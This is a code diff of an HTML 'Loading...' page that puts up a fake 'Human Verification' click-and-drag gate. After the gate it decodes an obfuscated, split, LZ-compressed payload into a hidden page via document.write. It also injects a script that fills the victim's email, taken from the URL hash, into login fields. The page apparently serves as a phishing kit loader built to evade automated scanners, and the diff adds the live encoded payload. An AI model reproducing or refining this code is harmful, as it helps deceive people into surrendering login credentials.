@@ -3,47 +3,36 @@
 <head>
 <meta charset="utf-8">
 <title>Loading...</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"><\/script>
 <style>
-  /* Slider UI */
-  #css-pass::before { content: "UECecF"; display:none; }
+  #css-pass::before { content: "zglYVA"; display:none; }
   #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
-  #human-box { background: white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; max-width:90%; width: 360px; }
-  #slider-container { margin-top: 20px; }
-  #slider-track {
-    width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px;
-    position: relative; margin: 0 auto; overflow: hidden;
-  }
-  #slider-handle {
-    width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 2px;
-    display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab;
-    user-select: none; touch-action: none; transition: background 0.12s, left 0.06s;
-  }
-  #slider-handle:active { cursor: grabbing; background: #0050e0; }
-  #slider-text { margin-top: 12px; font-size: 14px; color: #666; }
+  #human-box { background: white; border-radius:8px; padding:24px; box-shadow:0 6px 24px rgba(0,0,0,0.16); text-align:center; max-width:90%; width: 320px; }
+  #confirm-btn { display:inline-block; padding:12px 20px; background:#0b61ff; color:white; border-radius:6px; border:none; cursor:pointer; font-weight:600; font-size: 16px; margin-top: 8px; }
+  #confirm-btn:disabled { background: #ccc; cursor: not-allowed; }
+  #drag-hint { margin-top:16px; font-size:14px; color:#555; }
+  #debug-box { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.85); color: #0f0; padding: 12px; font-family: monospace; font-size: 12px; max-width: 400px; max-height: 250px; overflow: auto; z-index: 9999; border-radius: 4px; display: none; }
 </style>
 </head>
 <body>
 <div id="css-pass" aria-hidden="true"></div>
-
-<div id="human-overlay">
-  <div id="human-box">
-    <h2 style="margin:0 0 8px 0">Human Verification</h2>
-    <p style="margin:0 0 12px 0; color:#666;">Please complete the action below to continue.</p>
-    <div id="slider-container">
-      <div id="slider-track" aria-hidden="false">
-        <div id="slider-handle" role="button" tabindex="0" aria-label="drag handle">→</div>
-      </div>
-      <div id="slider-text">Drag to the right to prove you are human</div>
-    </div>
-  </div>
-</div>
+<div id="debug-box"></div>
 
 <script>
-/* Full decoder + robust pointer slider + safe prefill injection */
-console.log('[Decoder] starting (slider v2)');
+function log(msg) {
+  console.log(msg);
+  var db = document.getElementById('debug-box');
+  if (db) { db.style.display = 'block'; db.innerHTML += '> ' + msg + '<br>'; }
+}
 
-var piecesArr = ["REPLACE_WITH_REAL_PIECES_ARRAY"]; // <-- replace with your builder's pieces array
+log("[1] Decoder started");
+
+if (typeof LZString === 'undefined') {
+  log("[ERROR] LZString failed to load. Check internet/CDN.");
+}
+
+var piecesArr = ["OX5eUUo/f1F8SW42VHqBTj2ASms+XHBWXoBabUhQT0h6WHNsUUlIYYFvOmqAfk9hc0lIaHtgcUBIPE1IUGFLWmyAamsyaj8yUEBMSFeAUE9Wdk9TPUpyWV1cSHI4UXhrgT1dWXBUbzpISoBecUiAUlk+UkiBSH5SbFSAdEx4N05gdkhIU0gySG5IUXNIdEg3PE5uX3WBSGtsVkhYOWhSblR7cX9IdE5KWE9gVm5zSFZJek9YSVhoS35eblNIU0g3SVRKOUlMSE57blh+Sw==","YIBec1BIMnNYW39JfE1oVG9UWFJaaH5gVnNITnhLdktreEhOez1WcWlcS2lYQHk6Oz5ocUlaW3lac1NLWFpLSHBIf0hYV0hYV0huTT1YUYBuVnR+Ujtvdl1vdkA3fWtuTXJhbk50WE1Pb0lQYXNIWF1IbHJoPTt7e15ogFhtPTdZYG9cO29YdFBOWE8yOF5RgE11T4A4UUtub2BxVHJuOTcyfklrenk4fn9AN2tfeHxTQHZLaUx3TGGAdkxabUl+YX15Ulh2f1tNcmFdWA==","PHZxbFx4YExISFFrcXdUbmpPSWs+S350SXc+SEhrbk5edk1XekxwUUlbYEtJO2tvgXSBW207blxQVU89P0s/YGCAOH5VfHhWQE1eeIFUc1g8S3pWOHhXQHo+a2s7WXdba1B0S0w9c3s6VUo8a15fSDdTVFw+aFpMSExUPX5MOm56OUhIgFxJW1BddH51TlZKa3BwaTtyUlZKSH5PSHZaTVNuX294VVdwX0xIWVh0V3F5S2puSk48bF52WTldSG5IU4GAPDeBb0qAaFFRXA==","Uk+Bb35WS053SFFITzZIUV1+SEhgYVhueEs5bldSUW9JfUtgbVp5bkhIO1l6aHFed01odE55b1h3PWlhflZQgEhgcVd5aFBvXWBhSkg3gDpuek9ISDdLPzJsUG9uO3R+O3lSTXFpaG5Wc1p/bnZWSWFyUT9agDt0WEhIUD46VnBzelhwdntZVXZsP0hhbzJObnI2PFVxeT9aX255dUs+dT1MT3F1T3A8bk5hTlxOST85Pmg+aWtXaWpAeTiAeXRvUVR8O19fUzhMaklIeg==","XXlISkpeT3JRUlFXSEx0P1BYdXd+aXByNnJvb1tOTFJJW1Bdb1pRbHxqWVxsPGBJX25zYWxfUXNYMnZPPXR4S3J8Wll0eTxqb1h6TVxedXNMSFdKPW5LUFJqMk5+Sz1hVG+AWH5yeFNsUlZqclNuX1ZzS2FTP1M5YV1ecl9hWk5Ja05weGlsfHp+gXg/UWpoT25xVEhIO0xOXHxgczwySEhId2hJP2hVYGFhfmk/b29ed0lIST1Uek08UW9zdzh4VjpgfFFXOEhITHJ+ag==","SFdrbnFKVnhWa3h4N1JVeT87bmpSPm57YTtxUkk3PHtac1JQTVt7TG5XcXhTdDpWfV9XSmx/fkprbHBuPG85PlhodTl0Pk9hS1p0N188fDpJbGxxWz5yVnxxO2E9XHpXYDl7PlJuOXBpPHlzWG1fb1lQb2h3Xmp0bm90dT9+c2tfcThwOGyBOk1NW2s4aFVZT0l1e1dhOVZ7c05JYVVrWzlSe0w7SU92SmE3flVQNzh6eF1hOVxITm85O0hRc096VVpLXTY4aWxdX0hTSg==","WlNKSGpNO3B8P2tySGpISHBRa1l1WmxOU3d6dkxZc0o7dHpZXjpOen5peXFuTztScX1SgFJ0eko9TDt2WVhuUkhIUEtPYDs/PXA7TDdrO1hPN295Vkl6fztwfHRXWm56OHNrflM5f25UfEtxaX5TOzt2aD9WX3RvV3M7Nkk7VjtXWVtcUT9+QF57MlM6PVp1OG5UXEl2b3tLN1h7aUg/fjxKe0hId1NRX24yeml0XEtsUTp2e3puaHY/Skt1U2BLSFVKcFZRU0hUTExSSQ==","RkpKTlxwQVJV"];
+log("[2] Pieces loaded: " + piecesArr.length);
 
 function reassemblePieces() {
   var out = '';
@@ -59,147 +48,143 @@ function reassemblePieces() {
       }
       out += chars.reverse().join('');
     }
+    log("[3] Reassembled length: " + out.length);
     return out;
   } catch (e) {
-    console.error('[Decoder] reassemble failed', e);
+    log("[ERROR] Reassembly failed: " + e.message);
     return null;
   }
 }
 
-/* Robust slider implementation using Pointer Events with fallbacks */
-function initSlider() {
-  var handle = document.getElementById('slider-handle');
-  var track  = document.getElementById('slider-track');
-  if (!handle || !track) { console.warn('[Slider] elements missing'); return; }
+var gotClickConfirm = false;
+var gotDrag = false;
+var dragStart = null;
 
-  handle.style.left = '0px';
-  var active = false, pointerId = null, startX = 0, startLeft = 0;
-
-  function clamp(v, a, b){ return Math.max(a, Math.min(b, v)); }
-  function getMaxLeft() {
-    var tr = track.getBoundingClientRect();
-    var hd = handle.getBoundingClientRect();
-    return Math.max(0, Math.round(tr.width - hd.width));
-  }
-
-  function onPointerDown(ev) {
-    if (ev.pointerType === 'mouse' && ev.button !== 0) return;
-    ev.preventDefault();
-    handle.setPointerCapture && handle.setPointerCapture(ev.pointerId);
-    active = true; pointerId = ev.pointerId; startX = ev.clientX; startLeft = parseInt(handle.style.left || 0, 10) || 0;
-  }
-  function onPointerMove(ev) {
-    if (!active || ev.pointerId !== pointerId) return;
-    ev.preventDefault();
-    var dx = ev.clientX - startX;
-    var newLeft = clamp(startLeft + dx, 0, getMaxLeft());
-    handle.style.left = newLeft + 'px';
-    if (newLeft >= getMaxLeft() - 4) { try { handle.releasePointerCapture && handle.releasePointerCapture(pointerId); } catch(e){} active = false; triggerReconstruct(); }
-  }
-  function onPointerUp(ev) {
-    if (!active || ev.pointerId !== pointerId) return;
-    ev.preventDefault();
-    try { handle.releasePointerCapture && handle.releasePointerCapture(pointerId); } catch(e){}
-    active = false; pointerId = null;
-    var current = parseInt(handle.style.left || 0, 10) || 0;
-    if (current < getMaxLeft() - 4) handle.style.left = '0px'; else triggerReconstruct();
-  }
-
-  handle.addEventListener('pointerdown', onPointerDown);
-  window.addEventListener('pointermove', onPointerMove);
-  window.addEventListener('pointerup', onPointerUp);
-  handle.addEventListener('keydown', function(e){ if (e.key === 'Enter' || e.key === ' ' || e.key === 'Spacebar') { e.preventDefault(); handle.style.left = getMaxLeft() + 'px'; triggerReconstruct(); }});
-
-  handle.addEventListener('mousedown', onPointerDown);
-  window.addEventListener('mousemove', onPointerMove);
-  window.addEventListener('mouseup', onPointerUp);
-  handle.addEventListener('touchstart', function(e){ onPointerDown(e.changedTouches ? e.changedTouches[0] : e); }, {passive:false});
-  window.addEventListener('touchmove', function(e){ onPointerMove(e.changedTouches ? e.changedTouches[0] : e); }, {passive:false});
-  window.addEventListener('touchend', function(e){ onPointerUp(e.changedTouches ? e.changedTouches[0] : e); });
-
-  console.log('[Slider] initialized (pointer events)', !!window.PointerEvent);
+function showHumanOverlay() {
+  if (document.getElementById('human-overlay')) return;
+  var overlay = document.createElement('div');
+  overlay.id = 'human-overlay';
+  overlay.innerHTML = '<div id="human-box">' +
+    '<h2 style="margin:0 0 8px 0">Human Verification</h2>' +
+    '<p style="margin:0 0 12px 0; color:#666;">Click the button below, then click and drag anywhere on the page.</p>' +
+    '<button id="confirm-btn">I am human</button>' +
+    '<div id="drag-hint">Waiting for click...</div>' +
+    '</div>';
+  document.documentElement.appendChild(overlay);
+  
+  document.getElementById('confirm-btn').addEventListener('click', function() {
+    gotClickConfirm = true;
+    var btn = document.getElementById('confirm-btn');
+    btn.textContent = "Confirmed! Now drag anywhere...";
+    btn.disabled = true;
+    document.getElementById('drag-hint').textContent = "Click and drag your mouse/finger across the screen.";
+    log("[4] Click confirmed. Waiting for drag...");
+  });
 }
 
-if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initSlider); else initSlider();
+function onPointerDown(e) { 
+  dragStart = {
+    x: e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0, 
+    y: e.clientY || (e.touches && e.touches[0] && e.touches[0].clientY) || 0
+  }; 
+}
 
-function triggerReconstruct() { var ov = document.getElementById('human-overlay'); if (ov) ov.remove(); attemptReconstruct(); }
+function onPointerUp(e) {
+  if (!dragStart) return;
+  var x = e.clientX || (e.changedTouches && e.changedTouches[0] && e.changedTouches[0].clientX) || 0;
+  var y = e.clientY || (e.changedTouches && e.changedTouches[0] && e.changedTouches[0].clientY) || 0;
+  var dx = x - dragStart.x; 
+  var dy = y - dragStart.y; 
+  var dist = Math.sqrt(dx*dx + dy*dy);
+  
+  if (dist >= 50) {
+    gotDrag = true;
+    log("[5] Drag detected. Distance: " + dist.toFixed(1));
+    checkAndReconstruct();
+  }
+  dragStart = null;
+}
+
+function checkAndReconstruct() {
+  if (gotClickConfirm && gotDrag) {
+    log("[6] All checks passed. Reconstructing...");
+    var overlay = document.getElementById('human-overlay');
+    if (overlay) overlay.remove();
+    attemptReconstruct();
+  }
+}
+
+window.addEventListener('mousedown', onPointerDown);
+window.addEventListener('touchstart', onPointerDown, {passive:true});
+window.addEventListener('mouseup', onPointerUp);
+window.addEventListener('touchend', onPointerUp);
+
+setTimeout(function() {
+  showHumanOverlay();
+}, 100);
 
 function attemptReconstruct() {
   var assembled = reassemblePieces();
-  if (!assembled) { document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:40px;">Reassembly failed</h2>'; return; }
+  if (!assembled) {
+    log("[ERROR] Assembled payload is null/invalid");
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed. Check debug box (bottom left).</h2>';
+    return;
+  }
+
   try {
+    log("[7] Attempting LZString decompress...");
     var html = LZString.decompressFromBase64(assembled);
-    if (!html) throw new Error('decompress returned null');
-
-    var rawHash = '';
-    try { rawHash = (window.location.hash && window.location.hash.length > 1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : ''); } catch(e) { rawHash = ''; }
-
-    if (rawHash) {
-      console.log('[Decoder] email found:', rawHash);
-      try { sessionStorage.setItem('__prefill_email', rawHash); } catch(e){}
-
-      try {
-        html = html.replace(/(<input\s+[^>]*\b(?:id|name)\s*=\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){ if (/\bvalue\s*=/i.test(m)) return m; return m.replace(/>$/, ' value="' + rawHash + '">'); });
-        html = html.replace(/(<h[1-6][^>]*\bid\s*=\s*["']auth_email["'][^>]*>)(.*?)(<\/h[1-6]>)/ig, function(all, open, inner, close){ return open + rawHash + close; });
-        html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\bid\s*=\s*["']auth_email["'][^>]*>)(.*?)(<\/[^>]+>)/ig, function(all, open, inner, close){ return open + rawHash + close; });
-      } catch(e){ console.warn('[Decoder] replacement failed', e); }
-
-      (function(email){
-        function filler(emailVal){
-          try {
-            var hid = document.querySelector('input[name="email"][type="hidden"], input#email[type="hidden"]');
-            if (hid) { try { hid.value = emailVal; hid.dispatchEvent(new Event('input',{bubbles:true})); hid.dispatchEvent(new Event('change',{bubbles:true})); }catch(e){} }
-            try { var disp = document.getElementById('auth_email'); if (disp) disp.textContent = emailVal; } catch(e){}
-            var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
-            function tryFillVisible() {
-              var inputs = document.querySelectorAll('input');
-              if (!inputs || inputs.length === 0) return false;
-              var did = false;
-              for (var i=0;i<inputs.length;i++){
-                var el = inputs[i];
-                var id=(el.id||'').toLowerCase(), name=(el.name||'').toLowerCase(), ph=(el.placeholder||'').toLowerCase(), type=(el.type||'').toLowerCase();
-                if (type==='email' || id.indexOf('email')>-1 || name.indexOf('email')>-1 || id.indexOf('user')>-1 || name.indexOf('user')>-1 || ph.indexOf('email')>-1) {
-                  try { if (nativeSetter) nativeSetter.call(el, emailVal); else el.value = emailVal; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); did = true; } catch(e){}
-                }
-              }
-              return did;
-            }
-            var a=0; var id=setInterval(function(){ if (tryFillVisible()||a>30) clearInterval(id); a++; },300);
-            try {
-              var mo=new MutationObserver(function(){ if (tryFillVisible()){ try{ mo.disconnect(); }catch(e){} } });
-              mo.observe(document.documentElement||document.body, { childList:true, subtree:true });
-              setTimeout(function(){ try{ mo.disconnect(); }catch(e){} },10000);
-            } catch(e){}
-          } catch(e){}
-        }
-        try {
-          var s = '(' + filler.toString() + ')(' + JSON.stringify(email) + ');';
-          var scriptTag = '<scr' + 'ipt>' + s + '<' + '/script>';
-          if (/<\/body\s*>/i.test(html)) html = html.replace(/<\/body\s*>/i, scriptTag + '</body>');
-          else if (/<\/head\s*>/i.test(html)) html = html.replace(/<\/head\s*>/i, scriptTag + '</head>');
-          else html = scriptTag + html;
-        } catch(e) {
-          var fb = '<scr' + 'ipt>' + '(function(){try{var e=sessionStorage.getItem("__prefill_email")||decodeURIComponent(location.hash.replace(/^#/,"")); if(!e) return; try{ var h=document.querySelector("input[name=\\"email\\"][type=\\"hidden\\"]"); if(h){ h.value=e; h.dispatchEvent(new Event("input",{bubbles:true})); h.dispatchEvent(new Event("change",{bubbles:true})); } }catch(ex){} try{ var d=document.getElementById("auth_email"); if(d) d.textContent=e; }catch(ex){} }catch(ex){} })();' + '<' + '/script>';
-          if (/<\/body\s*>/i.test(html)) html = html.replace(/<\/body\s*>/i, fb + '</body>');
-          else if (/<\/head\s*>/i.test(html)) html = html.replace(/<\/head\s*>/i, fb + '</head>');
-          else html = fb + html;
-        }
-      })(rawHash);
-    } else {
-      console.log('[Decoder] no hash present; skipping prefill');
+    log("[8] Decompressed HTML length: " + (html ? html.length : "null"));
+    
+    if (!html) throw new Error('Decompression returned null or empty');
+    
+    var currentHash = window.location.hash;
+    var prefillScript = '';
+    if (currentHash && currentHash.length > 1) {
+      var emailValue = currentHash.substring(1);
+      var safeEmailJSON = JSON.stringify(emailValue);
+      prefillScript = '<scr' + 'ipt>' +
+        '(function() {' +
+        '  var emailVal = ' + safeEmailJSON + ';' +
+        '  var applyPrefill = function() {' +
+        '    var inputs = document.querySelectorAll("input");' +
+        '    for (var i = 0; i < inputs.length; i++) {' +
+        '      var el = inputs[i];' +
+        '      var type = (el.type || "").toLowerCase();' +
+        '      var name = (el.name || "").toLowerCase();' +
+        '      var id = (el.id || "").toLowerCase();' +
+        '      if (type === "hidden" || type === "password" || type === "submit" || type === "button") continue;' +
+        '      var isMatch = (type === "email" || name.includes("email") || id.includes("email") || name.includes("user") || id.includes("user") || name.includes("login") || id.includes("login") || name.includes("mail") || id.includes("mail"));' +
+        '      if (isMatch || inputs.length === 1 || type === "text") {' +
+        '        if (el.value !== emailVal) {' +
+        '          el.value = emailVal;' +
+        '          var tracker = el._valueTracker;' +
+        '          if (tracker) { tracker.setValue(emailVal); }' +
+        '          el.dispatchEvent(new Event("input", { bubbles: true }));' +
+        '          el.dispatchEvent(new Event("change", { bubbles: true }));' +
+        '        }' +
+        '      }' +
+        '    }' +
+        '  };' +
+        '  applyPrefill();' +
+        '  setTimeout(applyPrefill, 200);' +
+        '  setTimeout(applyPrefill, 600);' +
+        '  setTimeout(applyPrefill, 1500);' +
+        '})();' +
+      '<\/scr' + 'ipt>';
     }
 
+    log("[9] Rendering page via document.write...");
     document.open();
-    document.write(html);
+    document.write(html + prefillScript);
     document.close();
-    console.log('[Decoder] document.write complete');
+    log("[10] Done successfully.");
   } catch (e) {
-    console.error('[Decoder] fatal', e);
-    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:40px;">Reconstruction failed</h2>';
+    log("[ERROR] Fatal error: " + e.message);
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
   }
 }
 </script>
-
 <noscript><meta name="robots" content="noindex,nofollow"><p>JavaScript is required to view this page.</p></noscript>
 </body>
 </html>
